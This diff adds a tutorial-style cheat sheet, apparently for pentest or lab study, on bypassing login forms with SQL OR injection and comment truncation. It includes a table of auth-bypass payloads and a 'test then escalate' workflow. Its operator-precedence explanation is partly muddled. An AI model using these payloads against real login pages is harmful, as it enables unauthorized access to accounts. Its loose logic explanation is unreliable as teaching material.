@@ -1,0 +1,69 @@
+🔍 Quick Breakdown: Subverting Query Logic via OR Injection
+🎯 Goal:
+Login as any user (usually admin) without valid credentials, by manipulating SQL logic.
+
+🧠 The Logic Behind It
+Most login forms run a query like:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE username='INPUT' AND password='INPUT';
+You’re expected to input valid values for username and password — but we don’t play by those rules.
+
+🧨 The Injection
+You inject something that evaluates to TRUE — like ' OR '1'='1 — into the form fields.
+
+For example:
+
+sql
+Copy
+Edit
+username: admin' OR '1'='1
+password: anything
+The backend sees:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='anything';
+Because of operator precedence, AND gets evaluated before OR, so that becomes:
+
+sql
+Copy
+Edit
+username='admin' OR (TRUE AND FALSE)
+Which simplifies to:
+
+sql
+Copy
+Edit
+username='admin' OR FALSE → Result = TRUE
+So the query still returns a row — and you’re in.
+
+💬 Comments (like -- or #)
+You can terminate the rest of the query so it doesn’t break:
+
+sql
+Copy
+Edit
+username: ' OR '1'='1' -- 
+Which becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM logins WHERE username='' OR '1'='1' -- ' AND password='...';
+Now the password check is totally ignored. 🎯
+
+🧱 Auth Bypass Payloads to Memorize:
+Field	Payload
+Username	admin' OR '1'='1
+Username	' OR '1'='1' --
+Password	' OR '1'='1
+Password	anything' OR '1'='1
+Either	' OR 1=1# (MySQL)
+Use PayloadsAllTheThings for a treasure trove of more like these.
+
+🧠 Mental Workflow:
+"I see a login page → test a quote (') or OR 1=1 → get error or bypass? → escalate"
